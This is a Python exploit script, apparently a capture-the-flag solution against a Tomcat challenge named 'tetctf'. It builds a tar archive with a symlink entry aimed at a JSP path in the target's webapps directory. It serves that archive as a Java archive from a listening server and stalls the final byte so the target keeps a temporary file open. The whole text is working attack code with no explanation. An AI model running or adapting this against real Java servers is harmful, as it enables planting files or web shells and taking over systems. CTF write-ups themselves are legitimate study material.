import sys 
import time 
import threading 
import socketserver 
import telnetlib
import socket
from cStringIO import StringIO
from contextlib import closing
import tarfile
import os

def _build_tar_symlink(target):
    f = StringIO()
    t = tarfile.TarInfo()
    t.name = 'peterjson'
    t.mode |= 0120000 << 16L         # symlink file type
    t.type = tarfile.SYMTYPE
    t.linkname = target
    with closing(tarfile.open(fileobj=f, mode="w")) as tar:
        tar.addfile(t, target)
    return f.getvalue()

class JarRequestHandler(socketserver.BaseRequestHandler):  
  def handle(self):
    http_req = b''
    print('New connection:',self.client_address)
    while b'\r\n\r\n' not in http_req:
      try:
        http_req += self.request.recv(4096)
        print('\r\nClient req:\r\n',http_req.decode())
        jf = open("tar_symlink", 'rb')
        contents = jf.read()
        headers = ('''HTTP/1.0 200 OK\r\n'''
        '''Content-Type: application/java-archive\r\n\r\n''')
        self.request.sendall(headers.encode('ascii'))
        self.request.sendall(contents[:-1])
        time.sleep(20)
        print("done")
        self.request.sendall(contents[-1:])
      except Exception as e:
        print ("get error at:"+str(e))


if __name__ == '__main__':
    try:
        tar_symlink = _build_tar_symlink("/home/service/apache-tomcat-7.0.99/webapps/tetctf/peterjson.jsp")
        f = open("tar_symlink","wb+")
        f.write(tar_symlink)
        f.write(tar_symlink[:1])
        f.close()
        jarserver = socketserver.TCPServer(("0.0.0.0",9999), JarRequestHandler) 
        print ('waiting for connection...') 
        server_thread = threading.Thread(target=jarserver.serve_forever) 
        server_thread.daemon = True 
        server_thread.start()
        server_thread.join()
    except KeyboardInterrupt:
        sys.exit(-1)